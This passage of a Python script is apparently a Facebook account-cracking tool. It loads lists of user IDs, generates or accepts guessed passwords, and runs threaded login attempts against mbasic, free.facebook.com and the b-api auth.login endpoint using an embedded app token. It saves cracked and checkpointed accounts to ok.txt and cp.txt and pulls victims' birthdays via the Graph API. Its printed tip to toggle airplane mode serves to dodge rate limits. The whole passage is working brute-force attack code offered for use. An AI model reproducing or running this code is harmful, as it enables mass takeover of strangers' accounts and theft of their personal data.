		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	romm_intrnal()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+k+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(o+"["+k+"•"+o+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+k+"•"+o+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+k+"•"+o+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	romm_intrnal()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+k+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(o+"["+k+"•"+o+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+k+"•"+o+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+k+"•"+o+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
						m,d,y = ttl.split("/")
						m = bulan_ttl[m]
						print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
						self.cp.append("%s • %s • %s %s %s"%(fl.get("id"),i,d,m,y))
						open("cp.txt","a+").write("%s • %s • %s %s %s\n"%(fl.get("id"),i,d,m,y))
						break
					except(KeyError, IOError):
						m = " "
						d = " "
						y = " "
					except:pass
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackffb:
	os.system("clear")
	romm_intrnal()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+k+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(o+"["+k+"•"+o+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+k+"•"+o+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+k+"•"+o+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((o+"\n["+k+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(o+"["+k+"•"+o+"]"+p+" Choose : ")
      if f in[""," "]:
        print((o+"["+k+"!"+o+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((o+"["+k+"!"+o+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((o+"["+k+"•"+o+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(o+"["+k+"•"+o+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((o+"\n["+k+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(o+"["+k+"•"+o+"]"+p+" Choose : ")
      if f in[""," "]:
        print((o+"["+k+"!"+o+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((o+"["+k+"!"+o+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((o+"["+k+"•"+o+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(o+"["+k+"•"+o+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((o+"\n["+k+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((o+"\n["+h+"•"+o+"]"+p+" Crack Started..."+o+"\n["+k+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+k+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt"+o+"\n["+k+"•"+o+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
          m,d,y = ttl.split("/")
          m = bulan_ttl[m]
          self.cp.append("%s • %s • %s %s %s"%(username,password,d,m,y))
          print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s %s %s %s   "%(username,password,d,m,y,N)))
          save = open("cp.txt", "a+")
          save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
          save.close()
          return True
        except(KeyError, IOError):
          m = " "
          d = " "
          y = " "
        except:pass
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s   "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### RESULT ###

def results(Jvc,Baros):
        if len(Jvc) !=0:
                print(("[OK] : "+str(len(Jvc))))
        if len(Baros) !=0:
                print(("[CP] : "+str(len(Baros))))
        if len(Jvc) ==0 and len(Baros) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))

def ress():
    os.system("clear")
    romm_intrnal()
    print((o+"\n[ "+k+"Result Crack"+o+" ]"+p))
    print((o+"\n[ "+k+"OK"+o+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((o+"["+k+"!"+o+"]"+p+" No Result Found"))
    print((o+"\n[ "+k+"CP"+o+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((o+"["+k+"!"+o+"]"+p+" No Result Found"))
    input(o+"\n[ "+k+"Back"+o+" ]"+p)
    jvc_baros()

if __name__=="__main__":
	os.system("git pull")
	country()
